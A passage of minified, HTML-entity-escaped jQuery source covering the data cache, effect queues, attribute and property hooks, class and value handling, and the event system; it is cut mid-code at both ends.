c==&#34;string&#34;,l=a.nodeType,m=l?f.cache:a,n=l?a[j]:a[j]&amp;&amp;j,o=c===&#34;events&#34;;if((!n||!m[n]||!o&amp;&amp;!e&amp;&amp;!m[n].data)&amp;&amp;k&amp;&amp;d===b)return;n||(l?a[j]=n=++f.uuid:n=j),m[n]||(m[n]={},l||(m[n].toJSON=f.noop));if(typeof c==&#34;object&#34;||typeof c==&#34;function&#34;)e?m[n]=f.extend(m[n],c):m[n].data=f.extend(m[n].data,c);g=h=m[n],e||(h.data||(h.data={}),h=h.data),d!==b&amp;&amp;(h[f.camelCase(c)]=d);if(o&amp;&amp;!h[c])return g.events;k?(i=h[c],i==null&amp;&amp;(i=h[f.camelCase(c)])):i=h;return i}},removeData:function(a,b,c){if(!!f.acceptData(a)){var d,e,g,h=f.expando,i=a.nodeType,j=i?f.cache:a,k=i?a[h]:h;if(!j[k])return;if(b){d=c?j[k]:j[k].data;if(d){f.isArray(b)||(b in d?b=[b]:(b=f.camelCase(b),b in d?b=[b]:b=b.split(&#34; &#34;)));for(e=0,g=b.length;e&lt;g;e++)delete d[b[e]];if(!(c?m:f.isEmptyObject)(d))return}}if(!c){delete j[k].data;if(!m(j[k]))return}f.support.deleteExpando||!j.setInterval?delete j[k]:j[k]=null,i&amp;&amp;(f.support.deleteExpando?delete a[h]:a.removeAttribute?a.removeAttribute(h):a[h]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&amp;&amp;a.getAttribute(&#34;classid&#34;)===b}return!0}}),f.fn.extend({data:function(a,c){var d,e,g,h=null;if(typeof a==&#34;undefined&#34;){if(this.length){h=f.data(this[0]);if(this[0].nodeType===1&amp;&amp;!f._data(this[0],&#34;parsedAttrs&#34;)){e=this[0].attributes;for(var i=0,j=e.length;i&lt;j;i++)g=e[i].name,g.indexOf(&#34;data-&#34;)===0&amp;&amp;(g=f.camelCase(g.substring(5)),l(this[0],g,h[g]));f._data(this[0],&#34;parsedAttrs&#34;,!0)}}return h}if(typeof a==&#34;object&#34;)return this.each(function(){f.data(this,a)});d=a.split(&#34;.&#34;),d[1]=d[1]?&#34;.&#34;+d[1]:&#34;&#34;;if(c===b){h=this.triggerHandler(&#34;getData&#34;+d[1]+&#34;!&#34;,[d[0]]),h===b&amp;&amp;this.length&amp;&amp;(h=f.data(this[0],a),h=l(this[0],a,h));return h===b&amp;&amp;d[1]?this.data(d[0]):h}return this.each(function(){var b=f(this),e=[d[0],c];b.triggerHandler(&#34;setData&#34;+d[1]+&#34;!&#34;,e),f.data(this,a,c),b.triggerHandler(&#34;changeData&#34;+d[1]+&#34;!&#34;,e)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,b){a&amp;&amp;(b=(b||&#34;fx&#34;)+&#34;mark&#34;,f._data(a,b,(f._data(a,b)||0)+1))},_unmark:function(a,b,c){a!==!0&amp;&amp;(c=b,b=a,a=!1);if(b){c=c||&#34;fx&#34;;var d=c+&#34;mark&#34;,e=a?0:(f._data(b,d)||1)-1;e?f._data(b,d,e):(f.removeData(b,d,!0),n(b,c,&#34;mark&#34;))}},queue:function(a,b,c){var d;if(a){b=(b||&#34;fx&#34;)+&#34;queue&#34;,d=f._data(a,b),c&amp;&amp;(!d||f.isArray(c)?d=f._data(a,b,f.makeArray(c)):d.push(c));return d||[]}},dequeue:function(a,b){b=b||&#34;fx&#34;;var c=f.queue(a,b),d=c.shift(),e={};d===&#34;inprogress&#34;&amp;&amp;(d=c.shift()),d&amp;&amp;(b===&#34;fx&#34;&amp;&amp;c.unshift(&#34;inprogress&#34;),f._data(a,b+&#34;.run&#34;,e),d.call(a,function(){f.dequeue(a,b)},e)),c.length||(f.removeData(a,b+&#34;queue &#34;+b+&#34;.run&#34;,!0),n(a,b,&#34;queue&#34;))}}),f.fn.extend({queue:function(a,c){typeof a!=&#34;string&#34;&amp;&amp;(c=a,a=&#34;fx&#34;);if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a===&#34;fx&#34;&amp;&amp;b[0]!==&#34;inprogress&#34;&amp;&amp;f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||&#34;fx&#34;;return this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},clearQueue:function(a){return this.queue(a||&#34;fx&#34;,[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!=&#34;string&#34;&amp;&amp;(c=a,a=b),a=a||&#34;fx&#34;;var d=f.Deferred(),e=this,g=e.length,h=1,i=a+&#34;defer&#34;,j=a+&#34;queue&#34;,k=a+&#34;mark&#34;,l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&amp;&amp;f.data(e[g],i,f.Callbacks(&#34;once memory&#34;),!0))h++,l.add(m);m();return d.promise()}});var o=/[\n\t\r]/g,p=/\s+/,q=/\r/g,r=/^(?:button|input)$/i,s=/^(?:button|input|object|select|textarea)$/i,t=/^a(?:rea)?$/i,u=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,v=f.support.getSetAttribute,w,x,y;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,g,h,i;if(f.isFunction(a))return this.each(function(b){f(this).addClass(a.call(this,b,this.className))});if(a&amp;&amp;typeof a==&#34;string&#34;){b=a.split(p);for(c=0,d=this.length;c&lt;d;c++){e=this[c];if(e.nodeType===1)if(!e.className&amp;&amp;b.length===1)e.className=a;else{g=&#34; &#34;+e.className+&#34; &#34;;for(h=0,i=b.length;h&lt;i;h++)~g.indexOf(&#34; &#34;+b[h]+&#34; &#34;)||(g+=b[h]+&#34; &#34;);e.className=f.trim(g)}}}return this},removeClass:function(a){var c,d,e,g,h,i,j;if(f.isFunction(a))return this.each(function(b){f(this).removeClass(a.call(this,b,this.className))});if(a&amp;&amp;typeof a==&#34;string&#34;||a===b){c=(a||&#34;&#34;).split(p);for(d=0,e=this.length;d&lt;e;d++){g=this[d];if(g.nodeType===1&amp;&amp;g.className)if(a){h=(&#34; &#34;+g.className+&#34; &#34;).replace(o,&#34; &#34;);for(i=0,j=c.length;i&lt;j;i++)h=h.replace(&#34; &#34;+c[i]+&#34; &#34;,&#34; &#34;);g.className=f.trim(h)}else g.className=&#34;&#34;}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b==&#34;boolean&#34;;if(f.isFunction(a))return this.each(function(c){f(this).toggleClass(a.call(this,c,this.className,b),b)});return this.each(function(){if(c===&#34;string&#34;){var e,g=0,h=f(this),i=b,j=a.split(p);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?&#34;addClass&#34;:&#34;removeClass&#34;](e)}else if(c===&#34;undefined&#34;||c===&#34;boolean&#34;)this.className&amp;&amp;f._data(this,&#34;__className__&#34;,this.className),this.className=this.className||a===!1?&#34;&#34;:f._data(this,&#34;__className__&#34;)||&#34;&#34;})},hasClass:function(a){var b=&#34; &#34;+a+&#34; &#34;,c=0,d=this.length;for(;c&lt;d;c++)if(this[c].nodeType===1&amp;&amp;(&#34; &#34;+this[c].className+&#34; &#34;).replace(o,&#34; &#34;).indexOf(b)&gt;-1)return!0;return!1},val:function(a){var c,d,e,g=this[0];{if(!!arguments.length){e=f.isFunction(a);return this.each(function(d){var g=f(this),h;if(this.nodeType===1){e?h=a.call(this,d,g.val()):h=a,h==null?h=&#34;&#34;:typeof h==&#34;number&#34;?h+=&#34;&#34;:f.isArray(h)&amp;&amp;(h=f.map(h,function(a){return a==null?&#34;&#34;:a+&#34;&#34;})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!(&#34;set&#34;in c)||c.set(this,h,&#34;value&#34;)===b)this.value=h}})}if(g){c=f.valHooks[g.nodeName.toLowerCase()]||f.valHooks[g.type];if(c&amp;&amp;&#34;get&#34;in c&amp;&amp;(d=c.get(g,&#34;value&#34;))!==b)return d;d=g.value;return typeof d==&#34;string&#34;?d.replace(q,&#34;&#34;):d==null?&#34;&#34;:d}}}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c,d,e,g=a.selectedIndex,h=[],i=a.options,j=a.type===&#34;select-one&#34;;if(g&lt;0)return null;c=j?g:0,d=j?g+1:i.length;for(;c&lt;d;c++){e=i[c];if(e.selected&amp;&amp;(f.support.optDisabled?!e.disabled:e.getAttribute(&#34;disabled&#34;)===null)&amp;&amp;(!e.parentNode.disabled||!f.nodeName(e.parentNode,&#34;optgroup&#34;))){b=f(e).val();if(j)return b;h.push(b)}}if(j&amp;&amp;!h.length&amp;&amp;i.length)return f(i[g]).val();return h},set:function(a,b){var c=f.makeArray(b);f(a).find(&#34;option&#34;).each(function(){this.selected=f.inArray(f(this).val(),c)&gt;=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,d,e){var g,h,i,j=a.nodeType;if(!!a&amp;&amp;j!==3&amp;&amp;j!==8&amp;&amp;j!==2){if(e&amp;&amp;c in f.attrFn)return f(a)[c](d);if(typeof a.getAttribute==&#34;undefined&#34;)return f.prop(a,c,d);i=j!==1||!f.isXMLDoc(a),i&amp;&amp;(c=c.toLowerCase(),h=f.attrHooks[c]||(u.test(c)?x:w));if(d!==b){if(d===null){f.removeAttr(a,c);return}if(h&amp;&amp;&#34;set&#34;in h&amp;&amp;i&amp;&amp;(g=h.set(a,d,c))!==b)return g;a.setAttribute(c,&#34;&#34;+d);return d}if(h&amp;&amp;&#34;get&#34;in h&amp;&amp;i&amp;&amp;(g=h.get(a,c))!==null)return g;g=a.getAttribute(c);return g===null?b:g}},removeAttr:function(a,b){var c,d,e,g,h=0;if(b&amp;&amp;a.nodeType===1){d=b.toLowerCase().split(p),g=d.length;for(;h&lt;g;h++)e=d[h],e&amp;&amp;(c=f.propFix[e]||e,f.attr(a,e,&#34;&#34;),a.removeAttribute(v?e:c),u.test(e)&amp;&amp;c in a&amp;&amp;(a[c]=!1))}},attrHooks:{type:{set:function(a,b){if(r.test(a.nodeName)&amp;&amp;a.parentNode)f.error(&#34;type property can&#39;t be changed&#34;);else if(!f.support.radioValue&amp;&amp;b===&#34;radio&#34;&amp;&amp;f.nodeName(a,&#34;input&#34;)){var c=a.value;a.setAttribute(&#34;type&#34;,b),c&amp;&amp;(a.value=c);return b}}},value:{get:function(a,b){if(w&amp;&amp;f.nodeName(a,&#34;button&#34;))return w.get(a,b);return b in a?a.value:null},set:function(a,b,c){if(w&amp;&amp;f.nodeName(a,&#34;button&#34;))return w.set(a,b,c);a.value=b}}},propFix:{tabindex:&#34;tabIndex&#34;,readonly:&#34;readOnly&#34;,&#34;for&#34;:&#34;htmlFor&#34;,&#34;class&#34;:&#34;className&#34;,maxlength:&#34;maxLength&#34;,cellspacing:&#34;cellSpacing&#34;,cellpadding:&#34;cellPadding&#34;,rowspan:&#34;rowSpan&#34;,colspan:&#34;colSpan&#34;,usemap:&#34;useMap&#34;,frameborder:&#34;frameBorder&#34;,contenteditable:&#34;contentEditable&#34;},prop:function(a,c,d){var e,g,h,i=a.nodeType;if(!!a&amp;&amp;i!==3&amp;&amp;i!==8&amp;&amp;i!==2){h=i!==1||!f.isXMLDoc(a),h&amp;&amp;(c=f.propFix[c]||c,g=f.propHooks[c]);return d!==b?g&amp;&amp;&#34;set&#34;in g&amp;&amp;(e=g.set(a,d,c))!==b?e:a[c]=d:g&amp;&amp;&#34;get&#34;in g&amp;&amp;(e=g.get(a,c))!==null?e:a[c]}},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode(&#34;tabindex&#34;);return c&amp;&amp;c.specified?parseInt(c.value,10):s.test(a.nodeName)||t.test(a.nodeName)&amp;&amp;a.href?0:b}}}}),f.attrHooks.tabindex=f.propHooks.tabIndex,x={get:function(a,c){var d,e=f.prop(a,c);return e===!0||typeof e!=&#34;boolean&#34;&amp;&amp;(d=a.getAttributeNode(c))&amp;&amp;d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&amp;&amp;(a[d]=!0),a.setAttribute(c,c.toLowerCase()));return c}},v||(y={name:!0,id:!0},w=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&amp;&amp;(y[c]?d.nodeValue!==&#34;&#34;:d.specified)?d.nodeValue:b},set:function(a,b,d){var e=a.getAttributeNode(d);e||(e=c.createAttribute(d),a.setAttributeNode(e));return e.nodeValue=b+&#34;&#34;}},f.attrHooks.tabindex.set=w.set,f.each([&#34;width&#34;,&#34;height&#34;],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===&#34;&#34;){a.setAttribute(b,&#34;auto&#34;);return c}}})}),f.attrHooks.contenteditable={get:w.get,set:function(a,b,c){b===&#34;&#34;&amp;&amp;(b=&#34;false&#34;),w.set(a,b,c)}}),f.support.hrefNormalized||f.each([&#34;href&#34;,&#34;src&#34;,&#34;width&#34;,&#34;height&#34;],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=&#34;&#34;+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&amp;&amp;(b.selectedIndex,b.parentNode&amp;&amp;b.parentNode.selectedIndex);return null}})),f.support.enctype||(f.propFix.enctype=&#34;encoding&#34;),f.support.checkOn||f.each([&#34;radio&#34;,&#34;checkbox&#34;],function(){f.valHooks[this]={get:function(a){return a.getAttribute(&#34;value&#34;)===null?&#34;on&#34;:a.value}}}),f.each([&#34;radio&#34;,&#34;checkbox&#34;],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)&gt;=0}})});var z=/^(?:textarea|input|select)$/i,A=/^([^\.]*)?(?:\.(.+))?$/,B=/\bhover(\.\S+)?\b/,C=/^key/,D=/^(?:mouse|contextmenu)|click/,E=/^(?:focusinfocus|focusoutblur)$/,F=/^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,G=function(a){var b=F.exec(a);b&amp;&amp;(b[1]=(b[1]||&#34;&#34;).toLowerCase(),b[3]=b[3]&amp;&amp;new RegExp(&#34;(?:^|\\s)&#34;+b[3]+&#34;(?:\\s|$)&#34;));return b},H=function(a,b){var c=a.attributes||{};return(!b[1]||a.nodeName.toLowerCase()===b[1])&amp;&amp;(!b[2]||(c.id||{}).value===b[2])&amp;&amp;(!b[3]||b[3].test((c[&#34;class&#34;]||{}).value))},I=function(a){return f.event.special.hover?a:a.replace(B,&#34;mouseenter$1 mouseleave$1&#34;)};
f.event={add:function(a,c,d,e,g){var h,i,j,k,l,m,n,o,p,q,r,s;if(!(a.nodeType===3||a.nodeType===8||!c||!d||!(h=f._data(a)))){d.handler&amp;&amp;(p=d,d=p.handler),d.guid||(d.guid=f.guid++),j=h.events,j||(h.events=j={}),i=h.handle,i||(h.handle=i=function(a){return typeof f!=&#34;undefined&#34;&amp;&amp;(!a||f.event.triggered!==a.type)?f.event.dispatch.apply(i.elem,arguments):b},i.elem=a),c=f.trim(I(c)).split(&#34; &#34;);for(k=0;k&lt;c.length;k++){l=A.exec(c[k])||[],m=l[1],n=(l[2]||&#34;&#34;).split(&#34;.&#34;).sort(),s=f.event.special[m]||{},m=(g?s.delegateType:s.bindType)||m,s=f.event.special[m]||{},o=f.extend({type:m,origType:l[1],data:e,handler:d,guid:d.guid,selector:g,quick:G(g),namespace:n.join(&#34;.&#34;)},p),r=j[m];if(!r){r=j[m]=[],r.delegateCount=0;if(!s.setup||s.setup.call(a,e,n,i)===!1)a.addEventListener?a.addEventListener(m,i,!1):a.attachEvent&amp;&amp;a.attachEvent(&#34;on&#34;+m,i)}s.add&amp;&amp;(s.add.call(a,o),o.handler.guid||(o.handler.guid=d.guid)),g?r.splice(r.delegateCount++,0,o):r.push(o),f.event.global[m]=!0}a=null}},global:{},remove:function(a,b,c,d,e){var g=f.hasData(a)&amp;&amp;f._data(a),h,i,j,k,l,m,n,o,p,q,r,s;if(!!g&amp;&amp;!!(o=g.events)){b=f.trim(I(b||&#34;&#34;)).split(&#34; &#34;);for(h=0;h&lt;b.length;h++){i=A.exec(b[h])||[],j=k=i[1],l=i[2];if(!j){for(j in o)f.event.remove(a,j+b[h],c,d,!0);continue}p=f.event.special[j]||{},j=(d?p.delegateType:p.bindType)||j,r=o[j]||[],m=r.length,l=l?new RegExp(&#34;(^|\\.)&#34;+l.split(&#34;.&#34;).sort().join(&#34;\\.(?:.*\\.)?&#34;)+&#34;(\\.|$)&#34;):null;for(n=0;n&lt;r.length;n++)s=r[n],(e||k===s.origType)&amp;&amp;(!c||c.guid===s.guid)&amp;&amp;(!l||l.test(s.namespace))&amp;&amp;(!d||d===s.selector||d===&#34;**&#34;&amp;&amp;s.selector)&amp;&amp;(r.splice(n--,1),s.selector&amp;&amp;r.delegateCount--,p.remove&amp;&amp;p.remove.call(a,s));r.length===0&amp;&amp;m!==r.length&amp;&amp;((!p.teardown||p.teardown.call(a,l)===!1)&amp;&amp;f.removeEvent(a,j,g.handle),delete o[j])}f.isEmptyObject(o)&amp;&amp;(q=g.handle,q&amp;&amp;(q.elem=null),f.removeData(a,[&#34;events&#34;,&#34;handle&#34;],!0))}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){if(!e||e.nodeType!==3&amp;&amp;e.nodeType!==8){var h=c.type||c,i=[],j,k,l,m,n,o,p,q,r,s;if(E.test(h+f.event.triggered))return;h.indexOf(&#34;!&#34;)&gt;=0&amp;&amp;(h=h.slice(0,-1),k=!0),h.indexOf(&#34;.&#34;)&gt;=0&amp;&amp;(i=h.split(&#34;.&#34;),h=i.shift(),i.sort());if((!e||f.event.customEvent[h])&amp;&amp;!f.event.global[h])return;c=typeof c==&#34;object&#34;?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.isTrigger=!0,c.exclusive=k,c.namespace=i.join(&#34;.&#34;),c.namespace_re=c.namespace?new RegExp(&#34;(^|\\.)&#34;+i.join(&#34;\\.(?:.*\\.)?&#34;)+&#34;(\\.|$)&#34;):null,o=h.indexOf(&#34;:&#34;)&lt;0?&#34;on&#34;+h:&#34;&#34;;if(!e){j=f.cache;for(l in j)j[l].events&amp;&amp;j[l].events[h]&amp;&amp;f.event.trigger(c,d,j[l].handle.elem,!0);return}c.result=b,c.target||(c.target=e),d=d!=null?f.makeArray(d):[],d.unshift(c),p=f.event.special[h]||{};if(p.trigger&amp;&amp;p.trigger.apply(e,d)===!1)return;r=[[e,p.bindType||h]];if(!g&amp;&amp;!p.noBubble&amp;&amp;!f.isWindow(e)){s=p.delegateType||h,m=E.test(s+h)?e:e.parentNode,n=null;for(;m;m=m.parentNode)r.push([m,s]),n=m;n&amp;&amp;n===e.ownerDocument&amp;&amp;r.push([n.defaultView||n.parentWindow||a,s])}for(l=0;l&lt;r.length&amp;&amp;!c.isPropagationStopped();l++)m=r[l][0],c.type=r[l][1],q=(f._data(m,&#34;events&#34;)||{})[c.type]&amp;&amp;f._data(m,&#34;handle&#34;),q&amp;&amp;q.apply(m,d),q=o&amp;&amp;m[o],q&amp;&amp;f.acceptData(m)&amp;&amp;q.apply(m,d)===!1&amp;&amp;c.preventDefault();c.type=h,!g&amp;&amp;!c.isDefaultPrevented()&amp;&amp;(!p._default||p._default.apply(e.ownerDocument,d)===!1)&amp;&amp;(h!==&#34;click&#34;||!f.nodeName(e,&#34;a&#34;))&amp;&amp;f.acceptData(e)&amp;&amp;o&amp;&amp;e[h]&amp;&amp;(h!==&#34;focus&#34;&amp;&amp;h!==&#34;blur&#34;||c.target.offsetWidth!==0)&amp;&amp;!f.isWindow(e)&amp;&amp;(n=e[o],n&amp;&amp;(e[o]=null),f.event.triggered=h,e[h](),f.event.triggered=b,n&amp;&amp;(e[o]=n));return c.result}},dispatch:function(c){c=f.event.fix(c||a.event);var d=(f._data(this,&#34;events&#34;)||{})[c.type]||[],e=d.delegateCount,g=[].slice.call(arguments,0),h=!c.exclusive&amp;&amp;!c.namespace,i=[],j,k,l,m,n,o,p,q,r,s,t;g[0]=c,c.delegateTarget=this;if(e&amp;&amp;!c.target.disabled&amp;&amp;(!c.button||c.type!==&#34;click&#34;)){m=f(this),m.context=this.ownerDocument||this;for(l=c.target;l!=this;l=l.parentNode||this){o={},q=[],m[0]=l;for(j=0;j&lt;e;j++)r=d[j],s=r.selector,o[s]===b&amp;&amp;(o[s]=r.quick?H(l,r.quick):m.is(s)),o[s]&amp;&amp;q.push(r);q.length&amp;&amp;i.push({elem:l,matches:q})}}d.length&gt;e&amp;&amp;i.push({elem:this,matches:d.slice(e)});for(j=0;j&lt;i.length&amp;&amp;!c.isPropagationStopped();j++){p=i[j],c.currentTarget=p.elem;for(k=0;k&lt;p.matches.length&amp;&amp;!c.isImmediatePropagationStopped();k++){r=p.matches[k];if(h||!c.namespace&amp;&amp;!r.namespace||c.namespace_re&amp;&amp;c.namespace_re.test(r.namespace))c.data=r.data,c.handleObj=r,n=((f.event.special[r.origType]||{}).handle||r.handler).apply(p.elem,g),n!==b&amp;&amp;(c.result=n,n===!1&amp;&amp;(c.preventDefault(),c.stopPropagation()))}}return c.result},props:&#34;attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which&#34;.split(&#34; &#34;),fixHooks:{},keyHooks:{props:&#34;char charCode key keyCode&#34;.split(&#34; &#34;),filter:function(a,b){a.which==null&amp;&amp;(a.which=b.charCode!=null?b.charCode:b.keyCode);return a}},mouseHooks:{props:&#34;button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement&#34;.split(&#34; &#34;),filter:function(a,d){var e,f,g,h=d.button,i=d.fromElement;a.pageX==null&amp;&amp;d.clientX!=null&amp;&amp;(e=a.target.ownerDocument||c,f=e.documentElement,g=e.body,a.pageX=d.clientX+(f&amp;&amp;f.scrollLeft||g&amp;&amp;g.scrollLeft||0)-(f&amp;&amp;f.clientLeft||g&amp;&amp;g.clientLeft||0),a.pageY=d.clientY+(f&amp;&amp;f.scrollTop||g&amp;&amp;g.scrollTop||0)-(f&amp;&amp;f.clientTop||g&amp;&amp;g.clientTop||0)),!a.relatedTarget&amp;&amp;i&amp;&amp;(a.relatedTarget=i===a.target?d.toElement:i),!a.which&amp;&amp;h!==b&amp;&amp;(a.which=h&amp;1?1:h&amp;2?3:h&amp;4?2:0);return a}},fix:function(a){if(a[f.expando])return a;var d,e,g=a,h=f.event.fixHooks[a.type]||{},i=h.props?this.props.concat(h.props):this.props;a=f.Event(g);for(d=i.length;d;)e=i[--d],a[e]=g[e];a.target||(a.target=g.srcElement||c),a.target.nodeType===3&amp;&amp;(a.target=a.target.parentNode),a.metaKey===b&amp;&amp;(a.metaKey=a.ctrlKey);return h.filter?h.filter(a,g):a},special:{ready:{setup:f.bindReady},load:{noBubble:!0},focus:{delegateType:&#34;focusin&#34;},blur:{delegateType:&#34;focusout&#34;},beforeunload:{setup:function(a,b,c){f.isWindow(this)&amp;&amp;(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&amp;&amp;(this.onbeforeunload=null)}}},simulate:function(a,b,c,d){var e=f.extend(new f.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?f.event.trigger(e,null,b):f.event.dispatch.call(b,e),e.isDefaultPrevented()&amp;&amp;c.preventDefault()}},f.event.handle=f.event.dispatch,f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&amp;&amp;a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&amp;&amp;a.detachEvent(&#34;on&#34;+b,c)},f.Event=function(a,b){if(!(this instanceof f.Event))return new f.Event(a,b);a&amp;&amp;a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&amp;&amp;a.getPreventDefault()?K:J):this.type=a,b&amp;&amp;f.extend(this,b),this.timeStamp=a&amp;&amp;a.timeStamp||f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=K;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=K;var a=this.originalEvent;!a||(a.stopPropagation&amp;&amp;a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=K,this.stopPropagation()},isDefaultPrevented:J,isPropagationStopped:J,isImmediatePropagationStopped:J},f.each({mouseenter:&#34;mouseover&#34;,mouseleave:&#34;mouseout&#34;},function(a,b){f.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c=this,d=a.relatedTarget,e=a.handleObj,g=e.selector,h;if(!d||d!==c&amp;&amp;!f.contains(c,d))a.type=e.origType,h=e.handler.apply(this,arguments),a.type=b;return h}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(){if(f.nodeName(this,&#34;form&#34;))return!1;f.event.add(this,&#34;click._submit keypress._submit&#34;,function(a){var c=a.target,d=f.nodeName(c,&#34;input&#34;)||f.nodeName(c,&#34;button&#34;)?c.form:b;d&amp;&amp;!d._submit_attached&amp;&amp;(f.event.add(d,&#34;submit._submit&#34;,function(a){this.parentNode&amp;&amp;!a.isTrigger&amp;&amp;f.event.simulate(&#34;submit&#34;,this.parentNode,a,!0)}),d._submit_attached=!0)})},teardown:function(){if(f.nodeName(this,&#34;form&#34;))return!1;f.event.remove(this,&#34;._submit&#34;)}}),f.support.changeBubbles||(f.event.special.change={setup:function(){if(z.test(this.nodeName)){if(this.type===&#34;checkbox&#34;||this.type===&#34;radio&#34;)f.event.add(this,&#34;propertychange._change&#34;,function(a){a.originalEvent.propertyName===&#34;checked&#34;&amp;&amp;(this._just_changed=!0)}),f.event.add(this,&#34;click._change&#34;,function(a){this._just_changed&amp;&amp;!a.isTrigger&amp;&amp;(this._just_changed=!1,f.event.simulate(&#34;change&#34;,this,a,!0))});return!1}f.event.add(this,&#34;beforeactivate._change&#34;,function(a){var b=a.target;z.test(b.nodeName)&amp;&amp;!b._change_attached&amp;&amp;(f.event.add(b,&#34;change._change&#34;,function(a){this.parentNode&amp;&amp;!a.isSimulated&amp;&amp;!a.isTrigger&amp;&amp;f.event.simulate(&#34;change&#34;,this.parentNode,a,!0)}),b._change_attached=!0)})},handle:function(a){var b=a.target;if(this!==b||a.isSimulated||a.isTrigger||b.type!==&#34;radio&#34;&amp;&amp;b.type!==&#34;checkbox&#34;)return a.handleObj.handler.apply(this,arguments)},teardown:function(){f.event.remove(this,&#34;._change&#34;);return z.test(this.nodeName)}}),f.support.focusinBubbles||f.each({focus:&#34;focusin&#34;,blur:&#34;focusout&#34;},function(a,b){var d=0,e=function(a){f.event.simulate(b,a.target,f.event.fix(a),!0)};f.event.special[b]={setup:function(){d++===0&amp;&amp;c.addEventListener(a,e,!0)},teardown:function(){--d===0&amp;&amp;c.removeEventListener(a,e,!0)}}}),f.fn.extend({on:function(a,c,d,e,g){var h,i;if(typeof a==&#34;object&#34;){typeof c!=&#34;string&#34;&amp;&amp;(d=c,c=b);for(i in a)this.on(i,c,d,a[i],g);return this}d==null&amp;&amp;e==null?(e=c,d=c=b):e==null&amp;&amp;(typeof c==&#34;string&#34;?(e=d,d=b):(e=d,d=c,c=b));if(e===!1)e=J;else if(!e)return this;g===1&amp;&amp;(h=e,e=function(a){f().off(a);return h.apply(this,arguments)},e.guid=h.guid||(h.guid=f.guid++));return this.each(function(){f.event.add(this,a,e,d,c)})},one:function(a,b,c,d){return this.on.call(this,a,b,c,d,1)},off:function(a,c,d){if(a&amp;&amp;a.preventDefault&amp;&amp;a.handleObj){var e=a.handleObj;f(a.delegateTarget).off(e.namespace?e.type+&#34;.&#34;+e.namespace:e.type,e.selector,e.handler);return this}if(typeof a==&#34;object&#34;){for(var g in a)this.off(g,c,a[g]);return this}if(c===!1||typeof c==&#34;function&#34;)d=c,c=b;d===!1&amp;&amp;(d=J);return this.each(function(){f.event.remove(this,a,d,c)})},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},live:function(a,b,c){f(this.context).on(a,this.selector,b,c);return this},die:function(a,b){f(this.context).off(a,this.selector||&#34;**&#34;,b);return this},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return arguments.length==1?this.off(a,&#34;**&#34;):this.off(b,a,c)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f._data(this,&#34;lastToggle&#34;+a.guid)||0)%d;f._data(this,&#34;lastToggle&#34;+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d&lt;b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return 